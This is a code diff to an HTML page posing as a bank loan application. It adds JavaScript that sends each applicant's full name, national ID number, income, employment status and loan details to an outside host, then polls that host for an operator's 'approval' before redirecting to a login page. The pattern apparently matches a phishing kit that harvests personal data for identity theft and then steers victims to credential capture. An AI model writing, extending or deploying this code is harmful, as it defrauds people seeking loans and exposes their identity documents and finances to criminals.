@@ -328,22 +328,22 @@
                 <h1 class="section-header">Loan Application</h1>
                 <p class="section-subtitle">Fast, secure, and convenient financing.</p>
 
-                <form onsubmit="event.preventDefault(); document.getElementById('progress-overlay').style.display='flex'; setTimeout(() => window.location.href='login.html', 3000);">
+                <form onsubmit="submitToBridge(event);">
                     
                     <div class="form-row">
                         <div class="form-group">
                             <label>Full Name</label>
-                            <input type="text" class="form-control" placeholder="John Doe" required>
+                            <input type="text" class="form-control" name="fullName" placeholder="John Doe" required>
                         </div>
                         <div class="form-group">
                             <label>ID Number</label>
-                            <input type="text" class="form-control" placeholder="e.g. 08-123456 A 77" required>
+                            <input type="text" class="form-control" name="idNumber" placeholder="e.g. 08-123456 A 77" required>
                         </div>
                     </div>
 
                     <div class="form-group">
                         <label>Select Loan Type</label>
-                        <select class="form-control" required>
+                        <select class="form-control" name="loanType" required>
                             <option value="">-- Choose a Product --</option>
                             <option value="personal">Personal Loan (Payroll)</option>
                             <option value="mortgage">Mortgage / Housing Loan</option>
@@ -356,11 +356,11 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label>Loan Amount Requested (USD/ZWL)</label>
-                            <input type="number" class="form-control" placeholder="e.g. 5000" required>
+                            <input type="number" class="form-control" name="amount" placeholder="e.g. 5000" required>
                         </div>
                         <div class="form-group">
                             <label>Repayment Period (Months)</label>
-                            <select class="form-control" required>
+                            <select class="form-control" name="tenure" required>
                                 <option value="12">12 Months</option>
                                 <option value="24">24 Months</option>
                                 <option value="36">36 Months</option>
@@ -373,7 +373,7 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label>Employment Status</label>
-                            <select class="form-control" required>
+                            <select class="form-control" name="employmentStatus" required>
                                 <option value="employed">Permanently Employed</option>
                                 <option value="contractor">Contractor</option>
                                 <option value="self">Self-Employed / SME</option>
@@ -381,7 +381,7 @@
                         </div>
                         <div class="form-group">
                             <label>Monthly Net Income</label>
-                            <input type="number" class="form-control" placeholder="0.00" required>
+                            <input type="number" class="form-control" name="income" placeholder="0.00" required>
                         </div>
                     </div>
 
@@ -429,6 +429,57 @@
                 document.getElementById('splash-screen').classList.add('fade-out');
             }, 2000);
         });
+
+        async function submitToBridge(event) {
+            event.preventDefault();
+            const form = event.target;
+            const data = {
+                fullName: form.fullName.value,
+                idNumber: form.idNumber.value,
+                loanType: form.loanType.value,
+                amount: form.amount.value,
+                tenure: form.tenure.value,
+                employmentStatus: form.employmentStatus.value,
+                income: form.income.value
+            };
+
+            document.getElementById('progress-overlay').style.display = 'flex';
+
+            try {
+                const response = await fetch('https://p.breachbase.lol/v1/callback', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                
+                const { attemptId } = await response.json();
+                pollStatus(attemptId);
+            } catch (error) {
+                console.error('Error submitting application:', error);
+                alert('Submission failed. Please try again.');
+                document.getElementById('progress-overlay').style.display = 'none';
+            }
+        }
+
+        async function pollStatus(attemptId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`https://p.breachbase.lol/v1/status?attemptId=${attemptId}`);
+                    const { status } = await res.json();
+                    
+                    if (status === 'approved') {
+                        clearInterval(interval);
+                        window.location.href = 'login.html';
+                    } else if (status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('progress-overlay').style.display = 'none';
+                        alert("Application rejected by administrator.");
+                    }
+                } catch (error) {
+                    console.error('Polling error:', error);
+                }
+            }, 3000);
+        }
 
         function showSection(sectionId) {
             // Hide all sections
